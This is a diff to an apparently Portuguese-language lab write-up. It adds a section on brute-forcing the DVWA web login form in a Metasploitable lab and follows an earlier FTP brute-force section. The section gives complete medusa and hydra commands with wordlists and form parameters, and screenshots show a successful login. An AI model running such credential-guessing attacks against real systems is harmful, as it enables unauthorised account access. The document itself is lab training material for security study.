@@ -51,3 +51,38 @@ ftp 192.168.56.101
 
 Como de acordo com o print o acesso foi efetuado com as credenciais validadas pelo ataque BruteForce, e após é possível com isto efetuar downloads, uploads de informações ou documentos sensíveis, como também renomear e excluir arquivos de acordo com a permissão do usuário.
 
+# Simulando ataque brute force em formulários de login web (http) no sistema dvwa
+
+Dando segmento ao desafio é também possível efetuar o ataque brute force em páginas web em formulários de login. Então será feito uma simulação utilizando o DVWA (Damn Vulnerable Web Aplication) uma aplicação também que será explorada no ambiente metaspoitable. É possível o acesso ao site utilizando a conexão com o IP encontrado anteriormente
+
+<img width="1919" height="1029" alt="Captura de tela 2026-11-12 214017" src="https://github.com/user-attachments/assets/1e5f4b06-0b5f-4aa1-b554-2de5506c335f" />
+
+---
+
+Foi utilizada a mesma sequencia de informações de usuários e senhas do ataque brute force anterior no protocolo FTP. O ataque pode ser efetuado com a ferramenta medusa também com a seguinte linha de comando: 
+
+```bash
+medusa -h 192.168.56.101 -U UsersBruteForceFTP.txt -P PasswordBruteForceFTP.txt -M http
+-m PAGE:'/dvwa/login.php'
+-m FORM:'username=^USER^&password=^PASS^&Login=Login'
+-m 'FAIL=Login failed' -t 6
+```
+<img width="1919" height="1028" alt="Captura de tela 2026-11-12 214833" src="https://github.com/user-attachments/assets/c6678069-8372-4895-981e-fb21f8e6013e" />
+
+Como também é possivel utilizar a ferramenta Hydra para efetuar este ataque utilizando a seguinte linha de comando: 
+
+```bash
+hydra -L /root/UsersBruteForceFTP.txt \
+      -P /root/PasswordBruteForceFTP.txt \
+      192.168.56.101 http-form-post \
+      "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed:H=Cookie\: PHPSESSID=SEU_COOKIE_AQUI; security=low" \
+      -V -f
+```
+
+<img width="1919" height="1031" alt="Captura de tela 2026-11-12 215311" src="https://github.com/user-attachments/assets/b742e18a-cc60-4e78-b2ab-16da241c3a43" />
+
+Após o ataque foram feitos dois testes, um com credenciais invalidas e outro teste com as credenciais validadas pelas ferramentas:
+
+<img width="1919" height="1030" alt="Captura de tela 2026-11-12 215547" src="https://github.com/user-attachments/assets/e962e597-7746-41dd-aad7-7be5061bba7c" />
+
+<img width="1919" height="1031" alt="Captura de tela 2026-11-12 215619" src="https://github.com/user-attachments/assets/f71c0a0a-35e7-48a9-9b82-937098dc0b48" />
